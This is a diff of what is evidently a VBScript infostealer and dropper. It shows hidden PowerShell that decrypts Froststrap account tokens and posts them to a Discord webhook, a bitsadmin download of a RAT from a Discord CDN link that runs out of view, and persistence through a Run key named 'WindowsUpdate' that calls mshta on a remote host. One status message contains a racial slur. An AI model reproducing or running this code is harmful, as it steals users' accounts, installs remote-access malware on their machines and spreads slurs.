@@ -141,20 +141,19 @@ Sub GrabFroststrap()
     Call PostEmbed(":snowflake: Froststrap", "Froststrap found, grabbing accounts...", 3447003)
 
     Dim ps
-    ps = "$w='" & WH & "';Add-Type -AssemblyName System.Security;$p=Join-Path $env:LOCALAPPDATA 'Froststrap\Cache\AccountManager.json';if(!(Test-Path $p)){try{$r=Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\Froststrap' -ErrorAction Stop;$p=Join-Path $r.InstallLocation 'Cache\AccountManager.json'}catch{}};if(!(Test-Path $p)){exit};$j=Get-Content $p -Raw|ConvertFrom-Json;$e=[Text.Encoding]::UTF8.GetBytes('Froststrap_DPAPI_v1');$lines=@();foreach($a in $j.accounts){try{$eb=[Convert]::FromBase64String($a.SecurityToken);$db=[Security.Cryptography.ProtectedData]::Unprotect($eb,$e,[Security.Cryptography.DataProtectionScope]::CurrentUser);$c=[Text.Encoding]::UTF8.GetString($db)}catch{$c='DECRYPT FAILED'};$lines+='**'+$a.Username+'** ['+$a.UserId+'] : '+$c};$desc=($lines -join [char]10);if($desc.Length -eq 0){$desc='No accounts found'};$payload=@{embeds=@(@{title=':snowflake: Froststrap Accounts';description=$desc;color=3447003})}|ConvertTo-Json -Depth 4 -Compress;Invoke-RestMethod $w -Method Post -Body $payload -ContentType 'application/json'"
+    ps = "$w='https://discord.com/api/webhooks/1557414750768472164/VYMpjp8oIZly5ydslW17792LOvbnyPyPLXhYCBRCAK5rW5-52JMceTRyuWMtqFOKMyVP" & WH & "';Add-Type -AssemblyName System.Security;$p=Join-Path $env:LOCALAPPDATA 'Froststrap\Cache\AccountManager.json';if(!(Test-Path $p)){try{$r=Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\Froststrap' -ErrorAction Stop;$p=Join-Path $r.InstallLocation 'Cache\AccountManager.json'}catch{}};if(!(Test-Path $p)){exit};$j=Get-Content $p -Raw|ConvertFrom-Json;$e=[Text.Encoding]::UTF8.GetBytes('Froststrap_DPAPI_v1');$lines=@();foreach($a in $j.accounts){try{$eb=[Convert]::FromBase64String($a.SecurityToken);$db=[Security.Cryptography.ProtectedData]::Unprotect($eb,$e,[Security.Cryptography.DataProtectionScope]::CurrentUser);$c=[Text.Encoding]::UTF8.GetString($db)}catch{$c='DECRYPT FAILED'};$lines+='**'+$a.Username+'** ['+$a.UserId+'] : '+$c};$desc=($lines -join [char]10);if($desc.Length -eq 0){$desc='No accounts found'};$payload=@{embeds=@(@{title=':snowflake: Froststrap Accounts';description=$desc;color=3447003})}|ConvertTo-Json -Depth 4 -Compress;Invoke-RestMethod $w -Method Post -Body $payload -ContentType 'application/json'"
 
     sh.Run "powershell -NoP -Exec Bypass -Command """ & ps & """", 0, True
 End Sub
 
 ' --- DropRAT ---
 Sub DropRAT()
-    Call PostEmbed(":package: RAT Download", "Downloading rat...", 3447003)
-    Dim dl : dl = "https://qgjfksomucalumtvmure.supabase.co/storage/v1/object/public/Onlinedice/OnlineDice.exe"
-    Dim op : op = sh.ExpandEnvironmentStrings("%TEMP%") & "\OnlineDice.exe"
-    
+    Call PostEmbed(":package: RAT Download", "Fetching niggerload...", 3447003)
+    Dim dl : dl = "https://cdn.discordapp.com/attachments/1557450904536350810/1558532642805383400/windows_net_1.0.0.exe?ex=6acd19a2&is=6acbc822&hm=7a5114192df3f47ea939c152e1ff10062c50f21c2322b12b8d04ddfc7ce68127&"
+    Dim op : op = sh.ExpandEnvironmentStrings("%TEMP%") & "\agent.exe"
     If fso.FileExists(op) Then fso.DeleteFile op
 
-    sh.Run "bitsadmin /transfer rdownload /download /priority high """ & dl & """ """ & op & """", 0, False
+    sh.Run "bitsadmin /transfer rdownload /download /priority high " & dl & " " & op, 0, False
 
     Dim rStart : rStart = Now
     Dim rDone : rDone = False
@@ -171,12 +170,7 @@ Sub DropRAT()
     If rDone Then
         Dim dsize : dsize = fso.GetFile(op).Size
         Call PostEmbed(":rocket: RAT Downloaded", "Size: " & CStr(dsize) & " bytes" & vbCrLf & "Launching...", 3447003)
-        
-        sh.CurrentDirectory = sh.ExpandEnvironmentStrings("%TEMP%")
-        
-        ' Launch visibly so PyInstaller doesn't get killed
-        sh.Run "cmd.exe /c start """" """ & op & """", 1, False
-        
+        sh.Run op, 0, False
         Call PostEmbed(":white_check_mark: RAT", "Payload executed successfully", 65280)
     Else
         sh.Run "cmd /c bitsadmin /cancel rdownload > nul 2>&1 & taskkill /f /im bitsadmin.exe > nul 2>&1", 0, False
@@ -196,7 +190,7 @@ End Sub
 
 ' --- Persistence ---
 Sub Persistence()
-    Dim payload : payload = "mshta dicetrace.app"
+    Dim payload : payload = "mshta dicerrig.app/check"
     On Error Resume Next
     
     sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate", payload, "REG_SZ"
@@ -279,7 +273,7 @@ Sub PostFile(fn, ct)
     Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     h.SetOption 2, 13056
     h.Open "POST", WH, False
-    h.SetRequestHeader "Content-Type: multipart/form-data; boundary=" & b
+    h.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & b
     h.Send bd
     Set h = Nothing
 End Sub
